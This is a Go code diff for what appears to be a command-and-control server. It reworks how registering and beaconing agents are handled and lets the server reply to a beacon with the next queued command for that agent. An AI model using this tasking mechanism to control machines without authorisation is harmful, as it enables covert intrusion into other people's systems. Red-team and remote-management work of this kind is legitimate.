@@ -22,9 +22,9 @@ func HandleMessage(msg []byte, conn net.Conn) bool {
 
 	switch agentBeacon.Action.ActionType {
 	case "register":
-		return agentRegister(agentBeacon.Agent, conn)
+		return agentRegister(&agentBeacon, conn)
 	case "beacon":
-		return agentBeaconing(agentBeacon.Agent, conn)
+		return agentBeaconing(&agentBeacon, conn)
 	default:
 		break
 	}
@@ -32,12 +32,12 @@ func HandleMessage(msg []byte, conn net.Conn) bool {
 	return true
 }
 
-func agentRegister(agent *agents.Agent, conn net.Conn) bool {
+func agentRegister(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {
 
 	register := api.RegisterAgent{
 		RegisterTime: time.Now(),
 		PublicIP:     conn.RemoteAddr().String(),
-		Agent:        agent,
+		Agent:        agentBeacon.Agent,
 	}
 
 	var db database.DatabaseModel
@@ -62,12 +62,12 @@ func agentRegister(agent *agents.Agent, conn net.Conn) bool {
 	return true
 }
 
-func agentBeaconing(agent *agents.Agent, conn net.Conn) bool {
+func agentBeaconing(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {
 
 	beacon := api.BeaconAgent{
 		BeaconTime: time.Now(),
 		PublicIP:   conn.RemoteAddr().String(),
-		Agent:      agent,
+		Agent:      agentBeacon.Agent,
 	}
 
 	var db database.DatabaseModel
@@ -78,13 +78,29 @@ func agentBeaconing(agent *agents.Agent, conn net.Conn) bool {
 		return false
 	}
 
-	resp := &agents.Action{
-		ActionType:   "beacon",
-		ActionOutput: "success",
+	agent, err := db.GetAgentByID(beacon.Agent.UUID)
+	if err != nil {
+		return false
+	}
+
+	var resp agents.Action
+	if len(agent.Beacon.ActionQueue) == 0 {
+		resp = *agentBeacon.Action
+		resp.ActionOutput = "success"
+	} else {
+		action, err := db.GetActionByID(agent.Beacon.ActionQueue[0])
+		if err != nil {
+			return false
+		}
+
+		resp.UUID = action.UUID
+		resp.ActionType = action.ActionType
+		resp.ActionCmd = action.ActionCmd
+
 	}
 
 	msg, _ := json.Marshal(resp)
-	_, err := conn.Write(msg)
+	_, err = conn.Write(msg)
 	if err != nil {
 		return false
 	}
